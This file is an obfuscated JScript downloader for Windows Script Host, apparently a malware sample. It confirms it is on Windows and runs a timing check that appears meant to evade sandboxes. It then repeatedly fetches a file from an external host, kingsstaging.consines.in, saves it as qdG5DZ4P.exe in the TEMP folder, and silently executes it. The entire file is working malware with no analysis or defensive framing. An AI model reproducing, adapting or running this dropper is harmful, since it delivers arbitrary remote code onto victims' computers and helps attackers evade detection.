var d0 = false;
var Le = "CreateObject";
var oG = function E() {return WScript[Le]("WScript.Shell");}(), v = 11;
var eQ = "MSXML2.XMLHTTP";
var uB = 2123213;
var p = 0;
function C(o){oG["Run"](o, p, p);};
function jV(){return "" + eQ;};
function uT(y1, Bs){p = p * 1; return y1 - Bs;};
function O(){return Le;};
/*@cc_on
  @if (@_win32 || @_win64)
    d0 = true;
  @end
@*/
if (d0)
{
var k = "";
function y(){return 22;};
var B = 0; var Vk = 0;
function L()
{
var t = new this["Date"]();
var kn = t["getUTCMilliseconds"]();
WScript["Sleep"](y());
var t = new this["Date"]();
var K = t["getUTCMilliseconds"]();
WScript["Sleep"](y());
var t = new this["Date"]();
var D = t["getUTCMilliseconds"]();
var B = "Y";
B = uT(K, kn);
var Vk = "k0";
Vk = uT(D, K);
k = "open";
return uT(B, Vk);
}
var RV = false;
var vL = false;
for (var qI = p; qI < y() * 1; qI++){if (L() != p){
RV = true; 
Vk = "31" + 11 * B + Vk; 
vL = true; 
break;
}}
function q() {return ((RV == true) && (RV == vL)) ? 1 : p;};
if (RV && q() && vL){
function h() {return oG["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "qdG5DZ4P.exe";};
 Lv = jV();
 h0 = WScript[Le](Lv);
 var u = 1;
 while (u){
try {
h0[k]("GET", "http://kingsstaging.consines.in/l9osaw", false);
h0["send"]();
mN = "Sleep";
for (;;){WScript[mN](y() * 11); if (h0["readystate"] >= 2 * 2) break;};
u = p;
} catch(sh){};
}
function d(Zv) {var nM = (1, 2, 3, 4, 5, Zv); return nM;};
WR = WScript[O()]("ADODB.Stream");
Lv = WR;
Lv[k]();
Lv["type"] = d(1);
Lv["write"](h0["ResponseBody"]);
WR["position"] = d(p);
Lv["Save" + "ToFile"](h(), 2);
WR["c"+"lose"]();
y0 = h();
C(y0);
}
}

